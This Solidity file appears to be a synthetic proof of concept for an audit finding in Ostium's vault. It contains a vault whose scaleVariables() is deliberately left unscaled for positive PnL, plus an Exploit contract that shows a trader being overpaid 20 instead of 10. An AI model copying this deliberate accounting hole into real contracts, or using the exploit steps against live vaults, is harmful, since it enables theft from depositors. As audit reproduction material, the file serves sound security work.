// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Ostium — scaleVariables() skips a positive accPnlPerToken
    (Pashov, H-04, finding 65202).
    SYNTHETIC, cheatcode-free. The audited branch only scales when
    accPnlPerToken < 0. 100 tokens, 100 shares, trader PnL of 10
    (acc = 0.1e18). A 90-token deposit mints 100 shares and leaves
    acc at 0.1e18, so settlement pays 20 instead of 10. Off by 10. */

library Cast65202 {
    function toInt256(uint256 x) internal pure returns (int256) {
        return int256(x);
    }
}

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function pull(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[msg.sender] += amount;
    }
}

contract Trader {}

contract Vault {
    using Cast65202 for uint256;

    int256 public accPnlPerToken;
    uint256 public totalShares;
    Asset public asset;
    address public trader;
    uint256 public lastPaid;

    constructor(Asset _asset, address _trader) {
        asset = _asset;
        trader = _trader;
        totalShares = 100 ether;
        accPnlPerToken = 0.1 ether;
    }

    function totalSupply() public view returns (uint256) {
        return totalShares;
    }

    function scaleVariables(uint256 shares, bool isDeposit) public {
        uint256 supply = totalSupply();
        // @> VULN: a positive accPnlPerToken is left unchanged, so implied PnL grows with the new shares
        if (accPnlPerToken < 0) {
            accPnlPerToken = accPnlPerToken * supply.toInt256()
                / (isDeposit ? (supply + shares).toInt256() : (supply - shares).toInt256());
        }
    }

    function deposit(uint256 assetsIn) external returns (uint256 shares) {
        uint256 pnl = uint256(accPnlPerToken * int256(totalShares) / 1 ether);
        uint256 equity = asset.balanceOf(address(this)) - pnl;
        shares = assetsIn * totalShares / equity;
        scaleVariables(shares, true);
        totalShares += shares;
        asset.pull(msg.sender, assetsIn);
    }

    function settle() external returns (uint256 paid) {
        int256 implied = accPnlPerToken * int256(totalShares) / int256(1 ether);
        paid = uint256(implied);
        lastPaid = paid;
        asset.transfer(trader, paid);
    }
}

contract Exploit {
    uint256 public constant PAID = 20 ether;
    uint256 public constant FAIR = 10 ether;
    uint256 public constant OFF_BY = 10 ether;

    Asset public asset;
    Trader public trader;
    Vault public vault;

    constructor() {
        asset = new Asset();
        trader = new Trader();
        vault = new Vault(asset, address(trader));
        asset.mint(address(vault), 100 ether);
    }

    function run() external {
        asset.mint(address(this), 90 ether);
        uint256 shares = vault.deposit(90 ether);
        require(shares == 100 ether, "100 shares");
        require(vault.accPnlPerToken() == 0.1 ether, "acc not scaled");
        uint256 paid = vault.settle();
        require(paid == PAID, "paid 20");
        require(paid - FAIR == OFF_BY, "off by 10");
        require(asset.balanceOf(address(trader)) == PAID, "trader paid");
    }
}
